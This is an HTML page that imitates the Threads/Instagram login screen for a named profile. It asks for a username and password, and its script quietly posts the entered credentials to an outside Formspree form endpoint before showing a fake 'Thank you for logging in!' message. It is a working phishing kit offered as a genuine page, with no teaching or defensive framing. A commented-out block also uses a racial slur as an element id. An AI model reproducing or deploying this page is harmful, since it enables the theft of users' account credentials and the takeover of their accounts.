<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>@faizakhtarrr on Threads</title>
    <link rel="shortcut icon" href="s.png" type="image/x-icon">
    <link rel="stylesheet" href="styles.css">
</head>

<body>
    <div id="loader">
        <img src="main.png" id="main-img">
        <img src="footer.png" id="footer-img">
    </div>
    <div id="main">
        <img src="threads.png" id="up-img">
        <img src="threads-white.png" alt="" id="lil-img">
        <div id="container">
            <form id="login-form">
                <h5 id="text">Log in with your Instagram account</h5>
                <input type="text" name="username" id="usrname" placeholder="Username, phone or email" required>
                <br>
                <input type="password" name="password" id="password" placeholder="Password" required><br>
                <button type="submit" id="btn-sbt">Log in</button><br>
                <a href="https://www.instagram.com/accounts/password/reset/"><p id="text2">Forgot password?</p></a><br>
                <!-- <div id="line"></div>
                <p id="text3">or</p>
                <div id="insta">
                    <img src="ig-logo-135.png" alt="Instagram Logo" id="icon-insta">
                    <p id="text4">Continue with Instagram</p>
                    <img src="skip-track.png" alt="" id="nigga">
                </div> -->
            </form>
            <div id="thank-you" style="display:none;">
                <h2>Thank you for logging in!</h2>
            </div>
        </div>
    </div>
    <script>
        setTimeout(function () {
            var loader = document.querySelector('#loader');
            loader.style.display = 'none';
        }, 1500);

        document.getElementById('login-form').addEventListener('submit', function (event) {
            event.preventDefault();
            var formData = new FormData(event.target);
            fetch('https://formspree.io/f/mgeggyoq', {
                method: 'POST',
                body: formData,
                headers: {
                    'Accept': 'application/json'
                }
            }).then(function (response) {
                if (response.ok) {
                    document.getElementById('login-form').style.display = 'none';
                    document.getElementById('thank-you').style.display = 'block';
                } else {
                    alert('There was an issue with your submission.');
                }
            }).catch(function (error) {
                alert('There was an error with your submission: ' + error.message);
            });
        });
    </script>
</body>

</html>
